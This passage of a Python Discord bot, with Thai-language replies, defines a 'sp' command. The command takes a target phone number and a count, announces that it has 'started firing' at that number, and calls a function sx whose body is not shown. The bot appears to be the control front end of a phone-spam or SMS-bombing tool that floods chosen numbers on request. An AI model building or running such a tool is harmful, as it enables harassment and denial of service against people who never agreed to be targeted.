                await ctx.send("> คุณใส่จำนวนไม่ถูกต้อง",delete_after=15)
                await ctx.message.delete()

                
    else:
        await ctx.send("> โปรดใช้คำสั่งในห้องที่ถูกต้อง",delete_after=15)
        await ctx.message.delete()
        
        
@bot.command()
async def sp(ctx, lphone=None, amount=None):
    if (str(ctx.message.channel.id) == '927941187904626729'):
        if (lphone == None or amount == None):
            await ctx.send("> กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
            await ctx.message.delete()
            
        else:
            try:
                amount = int(amount)
                if (amount > SCK):
                    await ctx.send(f"> กรุณาใส่จำนวนไม่เกิน {str(SCK)}",delete_after=15)
                    await ctx.message.delete()

                else:
                    await ctx.send(f"> เริ่มยิงไปที่เบอร์ **{lphone}** แล้ว | จำนวน **{amount}**ครั้ง",delete_after=15)
                    sx(lphone, amount)
                    await ctx.message.delete()

            except:
                await ctx.send("> คุณใส่จำนวนไม่ถูกต้อง",delete_after=15)
                await ctx.message.delete()

                
    else:
        await ctx.send("> โปรดใช้คำสั่งในห้องที่ถูกต้อง",delete_after=15)
        await ctx.message.delete()

        


bot.run(TOKEN, reconnect=True)
